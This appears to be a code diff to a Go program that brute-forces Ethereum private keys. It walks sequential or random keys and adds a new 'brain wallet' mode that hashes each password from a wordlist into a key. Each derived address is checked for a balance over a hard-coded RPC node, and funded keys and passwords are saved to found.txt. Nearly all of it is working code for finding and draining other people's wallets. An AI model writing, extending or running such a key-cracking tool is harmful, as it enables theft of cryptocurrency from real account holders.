@@ -3,9 +3,13 @@ package main
 import (
 	"context"
 	"crypto/ecdsa"
+	"crypto/sha256"
+	"encoding/hex"
 	"flag"
 	"fmt"
+	"hash"
 	"io"
+	"io/ioutil"
 	"log"
 	"math/big"
 	"math/rand"
@@ -14,6 +18,7 @@ import (
 	"runtime"
 	"strconv"
 	"strings"
+	"sync"
 	"sync/atomic"
 	"syscall"
 	"time"
@@ -29,6 +34,7 @@ type config struct {
 	random  bool
 	server  string
 	port    int
+	brain   string
 }
 
 const (
@@ -37,9 +43,10 @@ const (
 
 var (
 	counter uint64 = 0
+	wg      sync.WaitGroup
 )
 
-func parseConfig() (*config, error) {
+func parseConfig() *config {
 	var cfg config
 
 	flag.StringVar(&cfg.privKey, "pk", "", "Start private key")
@@ -47,13 +54,35 @@ func parseConfig() (*config, error) {
 	flag.BoolVar(&cfg.random, "random", false, "Generate random private key")
 	flag.StringVar(&cfg.server, "server", "202.61.239.89", "Ethereum rpc server")
 	flag.IntVar(&cfg.port, "port", 8545, "Ethereum rpc port")
+	flag.StringVar(&cfg.brain, "brain", "", "Password list")
 	flag.Parse()
 
-	if !cfg.random && len(cfg.privKey) < 64 {
-		return nil, fmt.Errorf("private key length must be large then 64: '%s'", cfg.privKey)
+	return &cfg
+}
+
+func getPasswordList(path string) ([]string, error) {
+	f, err := ioutil.ReadFile(path)
+	if err != nil {
+		return nil, err
 	}
 
-	return &cfg, nil
+	passwords := strings.Split(string(f), "\n")
+	return passwords, nil
+}
+
+func SHA256(hasher hash.Hash, input []byte) (hash []byte) {
+	hasher.Reset()
+	hasher.Write(input)
+	hash = hasher.Sum(nil)
+	return hash
+
+}
+
+func NewPrivateKey(password string) string {
+	hasher := sha256.New()
+	sha := SHA256(hasher, []byte(password))
+	priv := hex.EncodeToString(sha)
+	return priv
 }
 
 func generateNextPrivKey(hex string) string {
@@ -82,6 +111,41 @@ func generateRandomPrivKey() string {
 	}
 
 	return randHex
+}
+
+func balanceAt(client *ethclient.Client, address string) (*big.Int, error) {
+	account := common.HexToAddress(address)
+	balance, err := client.BalanceAt(context.Background(), account, nil)
+	if err != nil {
+		if err == io.EOF {
+			log.Fatalf("Check balance: %s %v\n", address, err)
+		}
+		return nil, err
+	}
+	return balance, nil
+}
+
+func checkBrainBalance(passwords chan string, client *ethclient.Client) {
+	for password := range passwords {
+		privKey := NewPrivateKey(password)
+		address := generateAddressFromPrivKey(privKey)
+		creds := fmt.Sprintf("%s:%s", privKey, address)
+
+		balance, err := balanceAt(client, address)
+
+		if err != nil {
+			log.Printf("Check balance: %s %v\n", creds, err)
+			continue
+		}
+
+		if balance.Cmp(big.NewInt(0)) != 0 {
+			data := password + ":" + creds + ":" + balance.String() + "\n"
+			writeToFound(data, "found.txt")
+		}
+		atomic.AddUint64(&counter, 1)
+		fmt.Printf("Creds: %s Balance: %s Counter: %d\n", password+":"+creds, balance.String(), atomic.LoadUint64(&counter))
+	}
+	defer wg.Done()
 }
 
 func generateAddressFromPrivKey(hex string) string {
@@ -115,19 +179,12 @@ http://165.227.16.243:8545
 202.61.239.89:8545 NEW!
 */
 
-func checkBalance(data chan string, srv string, port int) {
-	client, err := ethclient.Dial("http://" + srv + ":" + strconv.Itoa(port))
-	if err != nil {
-		log.Fatalf("Client: %s\n", err)
-	}
-	defer client.Close()
-
+func checkBalance(data chan string, client *ethclient.Client) {
 	for {
 		creds := <-data
 		addr := strings.Split(creds, ":")[1]
 
-		account := common.HexToAddress(addr)
-		balance, err := client.BalanceAt(context.Background(), account, nil)
+		balance, err := balanceAt(client, addr)
 
 		if err != nil {
 			if err == io.EOF {
@@ -138,11 +195,11 @@ func checkBalance(data chan string, srv string, port int) {
 		}
 
 		if balance.Cmp(big.NewInt(0)) != 0 {
-			data := creds + "\n"
+			data := creds + ":" + balance.String() + "\n"
 			writeToFound(data, "found.txt")
 		}
 		atomic.AddUint64(&counter, 1)
-		fmt.Printf("Creds: %s Balance: %d Counter: %d\n", creds, balance, atomic.LoadUint64(&counter))
+		fmt.Printf("Creds: %s Balance: %s Counter: %d\n", creds, balance.String(), atomic.LoadUint64(&counter))
 	}
 }
 
@@ -164,10 +221,13 @@ func cleanup() {
 }
 
 func main() {
-	cfg, err := parseConfig()
+	cfg := parseConfig()
+
+	client, err := ethclient.Dial("http://" + cfg.server + ":" + strconv.Itoa(cfg.port))
 	if err != nil {
-		log.Fatal(err)
+		log.Fatalf("Client: %s\n", err)
 	}
+	defer client.Close()
 
 	chData := make(chan string)
 	chExit := make(chan os.Signal)
@@ -180,22 +240,48 @@ func main() {
 		os.Exit(0)
 	}()
 
-	for t := 0; t < cfg.threads; t++ {
-		go checkBalance(chData, cfg.server, cfg.port)
-	}
-
 	if cfg.random {
+		for t := 0; t < cfg.threads; t++ {
+			go checkBalance(chData, client)
+		}
+
 		for {
 			pk := generateRandomPrivKey()
 			addr := generateAddressFromPrivKey(pk)
 			chData <- fmt.Sprintf("%s:%s", pk, addr)
 		}
-	} else {
+	} else if cfg.privKey != "" {
+		if len(cfg.privKey) != 64 {
+			log.Fatal("Private key must be large then 64")
+		}
+
+		for t := 0; t < cfg.threads; t++ {
+			go checkBalance(chData, client)
+		}
+
 		pk := cfg.privKey
 		for {
 			pk = generateNextPrivKey(pk)
 			addr := generateAddressFromPrivKey(pk)
 			chData <- fmt.Sprintf("%s:%s", pk, addr)
 		}
+	} else {
+		passList, err := getPasswordList(cfg.brain)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		// chData := make(chan string)
+
+		for i := 0; i < int(cfg.threads); i++ {
+			wg.Add(1)
+			go checkBrainBalance(chData, client)
+		}
+
+		for _, password := range passList {
+			chData <- password
+		}
+		close(chData)
+		wg.Wait()
 	}
 }
